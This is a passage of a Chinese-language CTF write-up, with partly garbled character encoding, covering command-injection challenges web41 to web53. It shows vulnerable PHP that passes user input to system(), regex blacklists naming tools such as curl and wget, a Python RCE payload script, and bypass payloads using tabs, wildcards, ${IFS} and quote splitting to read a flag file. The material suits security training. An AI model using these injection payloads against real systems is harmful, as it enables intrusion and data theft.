class="string">r&quot;C:\Users\cyr\AppData\Local\Programs\Python\Python37\rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="comment">#å¡«txtçš„æ–‡ä»¶ä½ç½®</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t = f.readline()</span><br><span class="line"><span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line"><span class="comment"># print(i)</span></span><br><span class="line">s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line">output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;|\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;c&#x27;</span>: urllib.parse.unquote(param)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span> + r.text)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªè·‘rceçš„pythonè„šæœ¬ï¼Œæ”¾åœ¨pythonä¸­è¿è¡Œ</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220819161549473.png" style="zoom:80%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220819162119707.png" style="zoom:80%;" /><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   <span class="comment">//æŠŠè¿”å›ç»“æœå†™åˆ°é»‘æ´é‡Œé¢ï¼Œæ‰€æœ‰è¿”å›ç»“æœéƒ½ä¸ä¼šä¿å­˜ï¼Œ2æ˜¯é”™è¯¯è¾“å‡ºï¼Œ1æ˜¯æ ‡å‡†è¾“å‡ºï¼ŒæŠŠé”™è¯¯è¾“å‡ºç»‘å®šåˆ°æ ‡å‡†è¾“å‡ºé‡Œé¢ï¼Œç»Ÿä¸€è¾“å‡ºåˆ°é»‘æ´é‡Œé¢ï¼Œéƒ½ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨åŒå†™ç»•è¿‡ï¼Œç¬¬äºŒä¸ªlsè¢«å†™è¿›é»‘æ´é‡Œé¢ï¼Œç¬¬ä¸€ä¸ªlsæ­£å¸¸æ‰§è¡Œ</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220819165032765.png" style="zoom: 67%;" /><p>ç„¶åå°±è¾“å…¥å‘½ä»¤è·å–flagï¼Œtacé€†å‘è¿”å›ï¼Œcatçš„è¯ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥éœ€è¦æŸ¥çœ‹æºç æ‰èƒ½æ˜¾ç¤º</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220819165247092.png" style="zoom: 50%;" /><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 21:32:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;   <span class="comment">//è¿‡æ»¤åˆ†å·ï¼Œç”¨&amp;&amp;ä»£æ›¿</span></span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220902104055022.png"></p><h3 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 21:32:01</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220903134130452.png"></p><p>è¿™ä¸ªé¢˜å¤šè¿‡æ»¤äº†flagï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ï¼Ÿæˆ–è€…*è¿›è¡Œå ä½     <code>?c=tac fla*%26%26ls</code></p><h3 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 21:35:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220903135517231.png"></p><p>å¤šè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦ç»•è¿‡ç©ºæ ¼ï¼Œ%20   \t   éƒ½ä¸èƒ½ç”¨ï¼Œåªèƒ½ç”¨%09ä»£æ›¿è¿æ¥<code>?c=tac%09fla*%26%26ls</code></p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 21:50:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%09è™½ç„¶çœ‹ç€æ˜¯æ•°å­—ï¼Œä½†æ˜¯è§£ç ä»¥åä¸æ˜¯æ•°å­—äº†ï¼Œæ˜¯æ°´å¹³åˆ¶è¡¨ç¬¦ï¼Œæ‰€ä»¥ä¾æ—§å¯ä»¥ç”¨%09ç»•è¿‡ç©ºæ ¼ï¼Œè¿™é‡Œå¤šè¿‡æ»¤äº†*ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ï¼Ÿä»£æ›¿     <code>?c=tac%09fla?.php%26%26ls</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220903140458918.png"></p><h3 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 21:59:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ46</p><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:06:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ46   <code>?c=tac%09fla?.php%26%26ls</code></p><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:22:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ46   <code>?c=tac%09fla?.php%26%26ls</code></p><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:32:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220905191035277.png"></p><p>å¤šè¿‡æ»¤%09  %26ï¼Œé‡‡ç”¨å¸¦è¡Œå·è¯»çš„å‘½ä»¤ï¼Œä¸¤ä¸ªå•å¼•å·åˆ†å‰²å­—ç¬¦ä¸²ï¼Œä¸­é—´æ‰§è¡Œçš„è¯ä¼šè‡ªåŠ¨å¿½ç•¥</p><p><code>?c=nl&lt;fla&#39;&#39;g.php||ls</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220905191428439.png"></p><p>å³é”®æŸ¥çœ‹æºç ï¼Œå› ä¸ºè¢«æ³¨é‡Šäº†ï¼Œä¸åœ¨é¡µé¢æ˜¾ç¤º</p><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:42:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ50</p><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-05 22:50:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220907194730647.png"></p><p><code>?c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt%7C%7Cls</code>     å†™å…¥a.txtæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220907194751534.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220907195016558.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220907195416028.png"></p><p><code>?c=cp$&#123;IFS&#125;/fla?$&#123;IFS&#125;/var/www/html/b.txt||ls</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220907195341694.png"></p><h4 id="å¦ä¸€ç§è§£æ³•"><a href="#å¦ä¸€ç§è§£æ³•" class="headerlink" title="å¦ä¸€ç§è§£æ³•"></a>å¦ä¸€ç§è§£æ³•</h4><p>å‘½ä»¤ä½¿ç”¨nl æˆ–è€…uniq</p><p>?c&#x3D;ls${IFS}&#x2F;||</p><p>?c&#x3D;nl${IFS}&#x2F;flaâ€™â€™g||</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220908151230338.png"></p><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 18:21:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span 